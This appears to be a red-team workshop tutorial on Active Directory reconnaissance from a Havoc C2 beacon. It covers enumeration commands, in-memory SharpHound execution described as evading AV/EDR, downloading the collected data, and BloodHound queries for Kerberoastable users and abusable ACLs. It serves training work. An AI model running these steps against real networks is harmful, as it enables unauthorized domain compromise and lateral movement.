# 3 -  Enumeration and Reconnaissance

## Basic Active Directory Enumeration via Havoc Beacon
We can begin active reconnaissance inside the target environment to gather key details on user context, domain, and network layout.

### whoami
Get similar info like the Windows command `whoami /all`, but without starting the `cmd.exe` process
```
whoami
```
![image](https://github.com/user-attachments/assets/627a7dc6-0e75-4b71-bcb9-6583063e95df)

### dcenum
Enumerate domain information using Active Directory Domain Services:
```
dcenum
```
![image](https://github.com/user-attachments/assets/30588533-ed72-4e6b-9c26-63ef7b06dbd3)

### domainenum
List all users' accounts in the current domain:
```
domainenum
```
![image](https://github.com/user-attachments/assets/e0dabbea-56d0-4eda-8343-170ae148c6ac)

The commands above provide a solid foundation for identifying possible privilege escalation paths and lateral movement decisions, but there is more.

## Operator Tooling Setup
Before starting with post-exploitation or Beacon tasking, operators should ensure that the required toolset is in place and accessible.

## Required Tools Directory
All custom binaries for this exercise should be in the `/home/kali/tools/` folder:
1. SharpHound
2. GhostPack Compiled Binaries: (Let's clone the repository!)

Open a new terminal and run the following command:

```
cd /home/kali/tools/
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
```
<img width="700" height="500" alt="image" src="https://github.com/user-attachments/assets/40a8a06e-b92d-4593-9259-f51c1b42cac6" />

This repo includes:
> - [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos abuse)
> - [Seatbelt](https://github.com/GhostPack/Seatbelt) (host recon) 
> - [SharpUp](https://github.com/GhostPack/SharpUp) (privilege escalation checks)
> - And more precompiled .NET post-ex tools

# Deep Active Directory Enumeration

After initial reconnaissance and light post-exploitation using built-in Beacon commands and BOFs, it's time to bring in one of the most powerful tools for mapping and abusing Active Directory environments.

# SharpHound + BloodHound

**SharpHound** is the data collector; it runs on a compromised host and extracts detailed AD relationships, including:
- User and group memberships
- ACLs on OUs and GPOs
- Session and admin rights
- Trusts and delegation paths

This data is then ingested into BloodHound for analysis.

**BloodHound** is a graph-based analysis tool; it reveals hidden privilege escalation paths in Active Directory.

> Please see the official SharpHound [GitHub](https://github.com/SpecterOps/SharpHound) and BloodHound [GitHub](https://github.com/SpecterOps/BloodHound) for complete documentation.

## Running SharpHound from a Beacon

With a foothold on a domain-joined machine, we can now run SharpHound via Havoc to extract full Active Directory relationship data.

### Step-by-Step: SharpHound Collection
1. Create a new directory for the output files:
```
mkdir c:\loot
```
2. Enter into the created directory:
```
cd c:\loot
```
3. Confirm that you are in the right directory:
```
pwd
```
4. Inline-Execute the Sharphound.exe:
```
dotnet inline-execute /home/kali/tools/SharpHound/SharpHound.exe -c ALL
```
The dotnet inline-execute command in Havoc allows for in-memory execution of .NET assemblies directly from your Beacon, without writing the binary to disk.

![image](https://github.com/user-attachments/assets/963be847-adf8-4025-987a-86d9d9f25e7e)

### Why use inline-execute?
- Stealthy: avoids touching disk (helps bypass AV/EDR)
- Fast: executes entirely in memory.
- Ideal for tools like: SharpHound, Seatbelt, SharpUp, Rubeus, etc.

## Retrieving SharpHound Data

Once `SharpHound.exe` completes execution successfully, you’ll see the output in the Beacon console.

This indicates that SharpHound has finished collecting data and created a .zip archive (in `C:\loot\ or a specified output directory).

![image](https://github.com/user-attachments/assets/0b07bfa6-42df-464a-bb59-eb34048fca94)


### Downloading the Collected Data
In the beacon tab:
1. Confirm the output file name and size:
```
ls
```
2. Download the file to Havoc:
```
download c:\loot\YYYYMMDDHHMMSS_BloodHound.zip
```

3. Locate the `.zip` and move it to another directory on the Kali machine:
```
/home/kali/Havoc/Data/loot/[Date_time]/agents/[random string]/download/c:/loot/ YYYYMMDDHHMMSS_BloodHound.zip
```

![image](https://github.com/user-attachments/assets/dcf39b1a-7e40-468a-ad7d-81e0420ff8f2)

## BloodHound — Ingestion & Graph-Based Analysis

With the SharpHound `.zip` file retrieved from the target, we now proceed to BloodHound.

###  Step 1: Start BloodHound
1. Start Bloodhound on a new Terminal tab:
```bash
bloodhound 
```  

<img width="1570" height="1285" alt="image" src="https://github.com/user-attachments/assets/64663672-8156-4cf4-be5d-171b01df4fd7" />


2. Access the BloodHound GUI (Web Interface)
```
http://127.0.0.1:8080/ui/login
```
3. Enter the following credentials to log in:
- Email Address `admin`
- password: `Credentials will be provided during the presentation`

![image](https://github.com/user-attachments/assets/5d4ea8a0-6413-4f5c-8260-e920a8f7aa5a)

### Step 2: Ingest Collected Data
1. Click on "start by uploading your data":
<img width="1749" height="1181" alt="image" src="https://github.com/user-attachments/assets/847ab47d-5b05-4e93-b70d-37b897396f18" />

OR
1. Navigate to Administration
2. File Ingest
3. Click "Upload File(s)" in the top-right corner.
4. Select the `.zip` file downloaded from SharpHound
5. Click Upload
6. Wait for the import to complete and the file to be ingested!

<img width="2558" height="1605" alt="image" src="https://github.com/user-attachments/assets/55c545ee-6f73-46eb-95c7-3bba8a389c29" />

## Interpreting the Graphs

### Domain Information: All Domain Admins
1. Navigate to the top menu: Explore > CYPHER
2. Click the 📂 Folder icon in the top-left corner of the CYPHER panel.
3. In the pop-up list, select: Active Directory > Domain Information > All Domain Admins
4. BloodHound will return a graph with all known Domain Admins.
5. Click on any user node in the graph to open the right-hand Properties panel:  
- View object SID
- Group memberships
- Sessions
- Admin rights
- Potential attack paths

![image](https://github.com/user-attachments/assets/71317cbb-e9b4-4b54-8686-ef596b17d5f2)

### Kerberos Interaction: All Kerberoastable users
1. In the pop-up list, scroll down and select: Kerberos Interaction > All Kerberoastable users
2. The graph will populate with all accounts that have SPNs set and are Kerberoastable
3. Click on any user node to inspect:  
- SPN string
- Group memberships
- Sessions and rights

![image](https://github.com/user-attachments/assets/7eedc399-6e2e-4808-9717-cbead9ed4fea)

> - **These accounts have Service Principal Names (SPNs) and can be targeted for TGS ticket extraction and offline password cracking**
> - **These accounts can be targeted with tools like Rubeus or [Impacket](https://github.com/fortra/impacket) to extract TGS tickets and perform offline brute-force or dictionary attacks** 

### Dangerous Privileges: Dangerous privileges for Domain User groups

![image](https://github.com/user-attachments/assets/7222ea1a-5de8-4cb1-a3bc-0263196a8347)

Here we are searching for users/groups with exploitable rights.

Focus especially on users in the `Domain Users` group with elevated rights!

Usually we look for:
> - `GenericAll` on high-priv targets
> - `ForceChangePassword` (for password reset without knowing the current one)
> - `WriteDacl` for backdooring objects
> - `ADCSESC1` for Active Directory certificate templates vulnerabilities
> - `CanRDP` for Lateral Movement
